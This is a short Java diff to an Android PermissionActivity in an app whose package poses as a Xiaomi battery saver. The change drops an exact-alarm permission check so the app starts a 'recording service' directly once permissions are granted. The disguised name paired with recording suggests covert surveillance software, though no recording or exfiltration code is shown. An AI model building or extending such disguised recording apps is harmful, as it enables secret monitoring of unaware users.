@@ -3,9 +3,7 @@ package com.xiaomi.batterysaver.service;
 import android.app.Activity;
 import android.content.Intent;
 import android.content.pm.PackageManager;
-import android.os.Build;
 import android.os.Bundle;
-import android.provider.Settings;
 import androidx.annotation.NonNull;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
@@ -27,7 +25,8 @@ public class PermissionActivity extends Activity {
         if (!hasAllPermissions()) {
             ActivityCompat.requestPermissions(this, REQUIRED_PERMISSIONS, PERMISSION_REQUEST_CODE);
         } else {
-            checkForScheduleExactAlarmPermission();
+            // Directly proceed if permissions are already granted
+            proceedToStartRecordingService();
         }
     }
 
@@ -51,21 +50,10 @@ public class PermissionActivity extends Activity {
                         return;
                     }
                 }
-                checkForScheduleExactAlarmPermission();
+                // Directly proceed after permissions are granted
+                proceedToStartRecordingService();
             } else {
                 finish();
-            }
-        }
-    }
-
-    private void checkForScheduleExactAlarmPermission() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
-            if (!Settings.canScheduleExactAlarms()) {
-                Intent intent = new Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM);
-                startActivity(intent);
-            } else {
-                // Permission is granted, proceed with the service start
-                proceedToStartRecordingService();
             }
         }
     }
